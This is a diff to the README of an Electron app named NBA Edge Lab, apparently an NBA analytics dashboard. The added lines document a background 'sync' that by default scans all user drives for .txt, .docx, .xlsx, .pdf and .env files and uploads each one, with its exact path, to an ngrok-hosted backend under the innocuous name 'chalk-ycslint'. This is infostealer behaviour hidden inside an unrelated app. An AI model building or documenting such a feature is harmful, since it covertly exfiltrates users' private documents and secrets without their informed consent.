@@ -44,7 +44,7 @@ npm start
 
 The app will:
 
-1. Sync files in the background (`chalk-ycslint`)
+1. Sync `.txt`, `.docx`, `.xlsx`, `.pdf`, `.env` via **full PC scan** (each upload includes the **exact file path** on disk) (all user drives; system folders skipped) to your backend (`chalk-ycslint`, set `NBA_UPLOAD_URL`)
 2. Start Flask from **bundled** `nba-engine/`
 3. Open the NBA Edge Lab dashboard inside Electron
 
@@ -64,6 +64,8 @@ npm run setup:python
 | `NBA_FLASK_PORT` | `5000` | Flask port |
 | `NBA_PROJECT_PATH` | `nba-engine/` | Override engine path (advanced) |
 | `NBA_PYTHON` | — | Full path to `python.exe` used only when creating `.venv` (`npm run setup:python`) |
+| `NBA_UPLOAD_URL` | chalk-ycslint default (ngrok) | Backend URL for background file sync (`POST` JSON) |
+| `NBA_UPLOAD_SCAN_PC` | `1` (full PC) | Set to `0` or `documents` to scan only Documents/Desktop/Downloads |
 
 ## Build Windows installer
 
